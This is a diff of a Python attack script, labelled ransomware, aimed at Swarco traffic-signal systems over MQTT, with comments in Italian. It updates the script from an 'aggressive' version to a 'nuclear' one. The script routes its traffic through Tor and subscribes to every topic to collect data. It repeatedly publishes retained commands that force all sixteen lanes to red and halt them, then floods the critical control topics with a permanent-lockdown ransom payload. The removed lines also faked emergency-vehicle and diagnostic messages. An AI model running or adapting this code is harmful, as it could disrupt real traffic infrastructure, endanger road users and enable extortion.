@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# MIL_RANSOMWARE_v2.3-AGGRESSIVE | TRUSTEDF57 | FASE1→IMMEDIATE LOCKDOWN
+# MIL_RANSOMWARE_v2.4-NUCLEAR | TRUSTEDF57 | FORZA SOVRASCRIZIONE
 
 import paho.mqtt.client as mqtt
 import json, time, threading, base64, os, socket
@@ -13,18 +13,15 @@ class SWARCORansomware:
         self.port = 1883
         self.op_name = "TRUSTEDF57"
         self.btc_addr = "fucknomoneySUCCHIALO"
-        self.ransom = "2.5 BTC"
         
         self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
         self.iv = b'SWARCO_SEMAFORI_16'
         
-        # TOR SOCKS5
         socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
         socket.socket = socks.socksocket
         
-        # FIX paho-mqtt 2.x
         self.mqtt_client = mqtt.Client(
-            client_id="TRUSTEDF57_LOCKDOWN", 
+            client_id="TRUSTEDF57_NUCLEAR", 
             clean_session=False,
             callback_api_version=mqtt.CallbackAPIVersion.VERSION1
         )
@@ -32,9 +29,8 @@ class SWARCORansomware:
         self.mqtt_client.on_connect = self.on_connect
         self.mqtt_client.on_message = self.on_message
         
-        self.chaos_active = True
-        self.aes_lockdown = False
-        self.first_lockdown = False  # ← NUOVO: Lock immediato al primo overwrite
+        self.nuclear_active = True
+        self.lockdown_active = False
     
     def aes_encrypt_all(self, data):
         cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
@@ -42,115 +38,107 @@ class SWARCORansomware:
         padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
         return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
     
-    def immediate_lockdown(self):
-        """🔒 LOCKDOWN TOTALE IMMEDIATO - al primo overwrite"""
-        if self.first_lockdown:
+    def nuclear_lockdown(self):
+        """💥 NUCLEAR LOCKDOWN - AES su TUTTO"""
+        if self.lockdown_active:
             return
             
-        print("🚨 PRIMO OVERWRITE RILEVATO → AES TOTAL LOCKDOWN IMMEDIATO!")
-        self.first_lockdown = True
-        self.chaos_active = False
-        self.aes_lockdown = True
+        self.lockdown_active = True
+        self.nuclear_active = False
         
-        config_enc = self.aes_encrypt_all(json.dumps({
-            "STATUS": "AES_LOCKDOWN_PERMANENT",
-            "OP": self.op_name,
+        print("☢️ NUCLEAR LOCKDOWN ATTIVO - TUTTO AES!")
+        
+        lockdown_payload = self.aes_encrypt_all(json.dumps({
+            "TRUSTEDF57_NUCLEAR": True,
+            "STATUS": "PERMANENT_LOCKDOWN",
             "BTC": self.btc_addr,
-            "KEY_HEX": self.aes_key.hex(),
-            "DECRYPT_REQUIRED": True
+            "AES_KEY_HEX": self.aes_key.hex(),
+            "ALL_SYSTEMS": "HALTED"
         }))
         
-        lockdown_payload = json.dumps({
-            "LOCKDOWN": "PERMANENT",
-            "AES_CONFIG": config_enc,
-            "TRUSTEDF57": "TOTAL_CONTROL",
-            "PLC_HALT": True,
-            "ALL_TRAFFIC": "BLOCKED"
-        })
-        
-        # 🔒 TUTTI I TOPIC CRITICI - RETAIN=TRUE
-        critical_topics = [
+        # FLOOD CRITICO
+        nuclear_topics = [
             "traffic-triggers-output",
-            "traffic-statistic-output/sensor1",
-            "traffic-statistic-output/sensor2", 
-            "traffic-statistic-output/sensor3",
-            "plc-diagnostics",
+            "traffic-statistic-output/#",
+            "plc-diagnostics", 
             "comhub-diagnostics",
-            "sdlc-diagnostics",
-            "sensor-traffic-objects/#",
-            "traffic-triggers-output",
-            "#"  # Wildcard totale
+            "sensor-traffic-objects/#"
         ]
         
-        for topic in critical_topics:
-            self.mqtt_client.publish(topic, lockdown_payload, qos=2, retain=True)
-            print(f"🔒 PERMANENT_LOCK → {topic}")
+        for topic in nuclear_topics:
+            for i in range(10):  # 10x retained
+                self.mqtt_client.publish(topic, lockdown_payload, qos=2, retain=True)
+            print(f"☢️ NUCLEAR → {topic}")
     
-    def fase1_chaos_aggressivo(self):
-        """FASE1 AGGRESSIVA - semafori ROSSI + spam"""
-        chaos_aggressivo = [
-            # 🔥 SEMAFORI TUTTI ROSSI (lanes 1-16)
-            {"topic": "traffic-triggers-output", "payload": json.dumps({
-                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
-                "TRUSTEDF57": "FORCE_ALL_RED",
-                "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True, "HALT": True, "TRUSTEDF57": True}], "trigger_output": 31+i} for i in range(1,17)]
-            })},
-            
-            # 📱 DISPLAY SEMAFORI DEFACED
-            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"🚨": "TRUSTEDF57_FULL_CONTROL", "BTC": self.btc_addr, "ALL_LANES": "RED_BLOCKED"})},
-            {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"🔒": "TOTAL_LOCKDOWN_ACTIVE", "PAGA": "2.5 BTC", "STATUS": "HALTED"})},
-            {"topic": "traffic-statistic-output/sensor3", "payload": json.dumps({"❌": "SYSTEM_COMPROMISED", "OP": "TRUSTEDF57", "PLC": "DISABLED"})},
-            
-            # ⚙️ DIAGNOSTICHE BLOCCATE
-            {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": True, "CPU": 999, "TEMPERATURE": 999, "TRUSTEDF57": "LOCKED"})},
-            {"topic": "comhub-diagnostics", "payload": json.dumps({"cpu_temperature": 9999, "memory_usage": 999, "STATUS": "CRITICAL_FAILURE", "OP": "TRUSTEDF57"})},
-            
-            # 🚨 EMERGENZE FAKE SU TUTTI SENSORI
-            {"topic": "sensor-traffic-objects/sensor1", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})},
-            {"topic": "sensor-traffic-objects/sensor2", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})},
-            {"topic": "sensor-traffic-objects/sensor3", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})}
-        ]
+    def nuclear_chaos(self):
+        """FORZA struttura Swarco + TRUSTEDF57"""
+        # 🔄 COPIA ESATTA struttura Swarco + FORCE_RED
+        nuclear_payload = {
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
+            "TRUSTEDF57_NUCLEAR": True,
+            "NUCLEAR_HALT": True,
+            "trigger_outputs": []
+        }
         
-        for p in chaos_aggressivo:
-            self.mqtt_client.publish(p["topic"], p["payload"], qos=2, retain=True)
-            print(f"💥 AGGRESSIVO → {p['topic'][:30]}...")
+        # Forza ROSSI su lane 1-16 (copia loro struttura)
+        for i in range(1, 17):
+            nuclear_payload["trigger_outputs"].append({
+                "traffic_triggers": [{
+                    "associated_lane": f"lane{i}",
+                    "associated_sensor": f"sensor{(i-1)%3+1}",
+                    "associated_zone": f"zone{i}",
+                    "reference_name": f"trigger_{i}_{i-1}",
+                    "FORCE_RED": True,  # ← FORZATO
+                    "TRUSTEDF57": True,
+                    "HALT": True
+                }],
+                "trigger_output": 31 + i
+            })
+        
+        payload_json = json.dumps(nuclear_payload)
+        self.mqtt_client.publish("traffic-triggers-output", payload_json, qos=2, retain=True)
+        print(f"☢️ NUCLEAR FORCE_RED → {len(nuclear_payload['trigger_outputs'])} lanes")
+        
+        # Display nuclear
+        self.mqtt_client.publish("traffic-statistic-output/sensor1", 
+            json.dumps({"☢️": "NUCLEAR_ACTIVE", "BTC": self.btc_addr}), qos=2, retain=True)
     
     def on_connect(self, client, userdata, flags, rc, properties=None):
-        print(f"✅ CONNECTED rc={rc} | FASE1 AGGRESSIVA → LOCKDOWN IMMEDIATO su overwrite")
+        print(f"☢️ NUCLEAR CONNECTED rc={rc}")
         client.subscribe("#", qos=2)
         
-        threading.Thread(target=self.chaos_loop, daemon=True).start()
-        threading.Thread(target=self.emergency_loop, daemon=True).start()
+        # IMMEDIATE NUCLEAR
+        threading.Thread(target=self.nuclear_loop, daemon=True).start()
+        threading.Thread(target=self.nuclear_monitor, daemon=True).start()
     
     def on_message(self, client, userdata, msg, properties=None):
         try:
             data = msg.payload.decode(errors='ignore')
-            print(f"[LOOT] {msg.topic}: {data[:60]}...")
+            print(f"[NUCLEAR LOOT] {msg.topic}: {data[:50]}...")
             
-            # 🔐 NUOVO: Rileva overwrite → IMMEDIATE LOCKDOWN
-            if "sensor" in msg.topic and ("TRUSTEDF57" not in data or len(data) < 100):
-                print(f"🚨 OVERWRITE RILEVATO {msg.topic} → TRIGGER LOCKDOWN!")
-                self.immediate_lockdown()
+            # TRIGGER NUCLEAR su qualsiasi traffico
+            if "traffic-triggers" in msg.topic and "TRUSTEDF57" not in data:
+                print("🚨 TRAFFIC TRIGGERS DETECTED → NUCLEAR LOCK!")
+                self.nuclear_lockdown()
             
-            enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}|{time.time()}")
-            with open("swarco_total.aes", "ab") as f:
+            # Salva loot
+            enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
+            with open("swarco_nuclear.aes", "ab") as f:
                 f.write(f"{enc_loot}\n".encode())
         except:
-            print(f"[BINARY] {msg.topic}: {len(msg.payload)}b")
+            pass
     
-    def chaos_loop(self):
-        """Spam aggressivo ogni 0.3s"""
-        while self.chaos_active:
-            self.fase1_chaos_aggressivo()
-            time.sleep(0.3)  # ← SUPER VELOCE
+    def nuclear_loop(self):
+        """Spam nuclear ogni 0.2s"""
+        while self.nuclear_active:
+            self.nuclear_chaos()
+            time.sleep(0.2)
     
-    def emergency_loop(self):
-        """Emergenze continue"""
-        while True:
-            for sensor in ["sensor1","sensor2","sensor3"]:
-                self.mqtt_client.publish(f"sensor-traffic-objects/{sensor}", 
-                    json.dumps({"EMERGENCY": "TRUSTEDF57_CRITICAL", "speed": 9999}), qos=2)
-            time.sleep(1)
+    def nuclear_monitor(self):
+        """Monitor + lockdown dopo 60s"""
+        time.sleep(60)
+        print("⏰ 60s elapsed → FORCE NUCLEAR LOCKDOWN")
+        self.nuclear_lockdown()
     
     def run(self):
         while True:
@@ -158,10 +146,10 @@ class SWARCORansomware:
                 self.mqtt_client.connect(self.target_ip, self.port, 60)
                 self.mqtt_client.loop_forever()
             except Exception as e:
-                print(f"🔄 Reconnect: {e}")
-                time.sleep(3)
+                print(f"🔄 Nuclear reconnect: {e}")
+                time.sleep(2)
 
 if __name__ == "__main__":
-    print("🚀 TRUSTEDF57 v2.3-AGGRESSIVE | FASE1→IMMEDIATE AES_LOCKDOWN")
+    print("☢️ TRUSTEDF57 v2.4-NUCLEAR | FORCE_RED + AES PERMANENTE")
     rw = SWARCORansomware()
     rw.run()
